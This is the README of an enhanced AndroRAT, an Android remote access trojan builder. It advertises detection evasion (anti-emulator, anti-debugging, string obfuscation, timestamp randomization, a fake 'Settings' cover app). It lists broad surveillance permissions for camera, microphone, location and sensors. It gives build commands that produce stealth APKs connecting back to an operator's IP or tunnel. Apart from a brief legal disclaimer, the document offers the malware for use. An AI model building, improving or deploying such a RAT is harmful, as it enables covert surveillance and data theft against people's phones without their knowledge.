# AndroRAT Enhanced - Detection Evasion & Android 14+ Compatibility

This enhanced version of AndroRAT includes advanced detection evasion techniques and full compatibility with the latest Android versions.

## 🚀 New Features

### Android 15+ Compatibility
- **Updated SDK**: Now targeting Android 15 (API 35) with backward compatibility to Android 6 (API 23)
- **Modern Permissions**: Full support for Android 13-16 permission model including scoped storage and media permissions
- **Android 15+ Features**: Body sensors background access and media projection state permissions
- **Enhanced Foreground Services**: Proper service types and notification handling for Android 12+
- **Runtime Permissions**: Automatic permission request handling for modern Android versions including Android 15/16

### 🛡️ Detection Evasion Techniques

#### Anti-Analysis Features
- **Anti-Emulator Detection**: Automatically detects and handles emulator environments
- **Behavioral Analysis Evasion**: Includes timing attacks and pattern disruption
- **Anti-Debugging**: Basic debugger detection and countermeasures
- **String Obfuscation**: Automatic obfuscation of suspicious strings in compiled APK

#### Stealth Features
- **Legitimate Cover Activity**: Includes a realistic "Settings" app interface
- **Random Delays**: Jitter and delays to avoid behavioral fingerprinting
- **Network Security Config**: Enhanced SSL/TLS handling for better stealth
- **File Timestamp Randomization**: Avoid signature-based detection

## 📱 Usage

### Basic APK Generation
```bash
# Standard APK build
python3 androRAT.py --build -i 192.168.1.100 -p 8080 -o my_app.apk

# With tunneling
python3 androRAT.py --build --tunnel -p 8080 -o tunnel_app.apk
```

### Enhanced Stealth Mode
```bash
# Maximum stealth with all evasion techniques
python3 androRAT.py --build --stealth -i 127.0.0.1 -p 8080 -o stealth_app.apk

# With random package name
python3 androRAT.py --build --stealth --random-package -i 127.0.0.1 -p 8080 -o secure_app.apk
```

### New CLI Options
- `--stealth`: Enable maximum stealth mode with all detection evasion techniques
- `--random-package`: Use randomly generated package names for better evasion
- `--tunnel-service`: Choose specific tunneling service (cloudflared, serveo, localtunnel, ngrok, auto)

## 🔧 Technical Improvements

### Android Manifest Enhancements
- Android 13+ media permissions (`POST_NOTIFICATIONS`, `READ_MEDIA_*`)
- Android 14+ visual media permissions (`READ_MEDIA_VISUAL_USER_SELECTED`)
- Android 15+ permissions (`BODY_SENSORS_BACKGROUND`, `ACCESS_MEDIA_PROJECTION_STATE`)
- Enhanced foreground service types (`dataSync`, `camera`, `microphone`, `location`, `health`)
- Proper component export declarations
- Network security configuration for cleartext traffic

### Java Code Improvements
- **MainActivity**: Enhanced with runtime permission handling and anti-analysis
- **mainService**: Improved stealth with legitimate-looking foreground notifications
- **SettingsActivity**: New cover activity that appears as a legitimate settings app

### Build Process Enhancements
- String obfuscation in smali files
- Random timestamp application
- Enhanced error handling
- Improved stealth messaging

## 📊 Compatibility Matrix

| Android Version | API Level | Support Status |
|----------------|-----------|----------------|
| Android 6.0+   | 23+       | ✅ Full Support |
| Android 12+    | 31+       | ✅ Enhanced Features |
| Android 13+    | 33+       | ✅ Modern Permissions |
| Android 14+    | 34+       | ✅ Visual Media Features |
| Android 15+    | 35+       | ✅ Latest Features |
| Android 16     | 36        | ✅ Future Ready |

## 🧪 Testing

Run the comprehensive test suite:
```bash
# Basic tests
python3 test_androrat.py

# Comprehensive tests
python3 comprehensive_test.py
```

Test APK building with stealth:
```bash
python3 androRAT.py --build --stealth -i 127.0.0.1 -p 8080 -o test.apk
```

## ⚠️ Important Notes

### Legal Disclaimer
This tool is for educational and authorized security testing purposes only. Users are responsible for compliance with all applicable laws and regulations.

### Detection Evasion Effectiveness
- Detection evasion techniques are designed to avoid basic automated analysis
- Effectiveness may vary depending on specific security solutions
- Regular updates may be needed to maintain evasion capabilities
- No evasion technique is 100% guaranteed

### Best Practices
1. Always test APKs in isolated environments first
2. Use tunneling services for remote connections
3. Keep the tool updated for latest Android compatibility
4. Use stealth mode for maximum evasion effectiveness

## 🔄 Changelog

### v2.1 - Android 15/16 Support
- Added Android 15 (API 35) and Android 16 (API 36) compatibility
- Updated SDK to API 35 for latest Android features
- Added Android 15+ specific permissions (BODY_SENSORS_BACKGROUND, ACCESS_MEDIA_PROJECTION_STATE)
- Enhanced foreground service types for health data

### v2.0 - Enhanced Detection Evasion
- Added Android 14+ compatibility
- Implemented comprehensive detection evasion techniques
- Enhanced stealth APK building process
- Added anti-analysis and anti-emulator features
- Improved permission handling for modern Android

### Previous Versions
- Fixed ngrok credit card requirement with alternative tunneling
- Resolved SSL certificate verification issues
- Fixed Python version compatibility
- Enhanced Unicode/ASCII encoding support